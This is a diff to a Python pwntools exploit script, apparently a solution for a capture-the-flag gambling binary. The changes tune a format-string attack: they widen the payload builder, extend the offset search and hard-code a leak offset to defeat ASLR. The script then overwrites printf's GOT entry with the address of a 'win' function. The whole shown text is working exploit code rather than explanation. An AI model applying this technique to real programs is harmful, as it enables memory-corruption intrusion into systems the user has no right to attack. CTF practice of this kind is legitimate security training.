@@ -34,7 +34,7 @@ def connect_binary():
 ############## Exploit ###############
 ######################################
 
-def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=8):
+def build_format_string(target, goal, offset=1, bytes_to_write=8, max_size=104):
     if isinstance(target, int):
         target = p64(target)
     if isinstance(goal, int):
@@ -112,7 +112,7 @@ def gamble(amount=1):
         log.info(f'Selected [1] : {one}')
     elif not is_fibonacci(two):
         P.sendline(b"2")
-        log.info(f'Selected [1] : {two}')
+        log.info(f'Selected [2] : {two}')
     elif not is_fibonacci(three):
         P.sendline(b"3")
         log.info(f'Selected [3] : {three}')
@@ -125,7 +125,7 @@ def gamble(amount=1):
    
 def find_offset(after = b'?\n', option = 2):
     with context.local(log_level='error'):
-        for i in range(1, 500):
+        for i in range(1, 1000):
             connect_binary()
 
             P.sendlineafter(after, f'AAAABBBB%{i}$p'.encode())
@@ -148,17 +148,19 @@ def exploit():
     gamble()
 
     leak = P.recvuntil(b'!',drop=True)[14:]
-    log.info(f"Leaked: {leak}")
+    log.info(f"Leaked: {leak}") # prints the address of g_player
     P.recvuntil(b'continue...\n', drop=True)
 
-    E.address = (int(leak, 16) - 24) - E.symbols['g_player']
-    target = E.got['printf']
-    win = E.symbols['win']
+    # E.address = (int(leak, 16) - 32) - E.symbols['g_player'] # 24 or 32?
+    # target = E.got['printf']
+    # win = E.symbols['win']
 
-    # # Alternatively,
+    # Alternatively,
     # base = int(leak, 16) - 0xd8 - 0x1e08        # try 0xd8 or 459
-    # win = base + 0x1219                         # win function
-    # target = base + 0x4258                      # printf GOT
+
+    base = int(leak, 16) - 0x44c0               # ASLR bypass
+    win = base + 0x1219                         # win function
+    target = base + 0x4258                      # printf GOT
 
     log.info(f"TARGET function address: {hex(target)}")
     log.info(f"WIN function address: {hex(win)}")
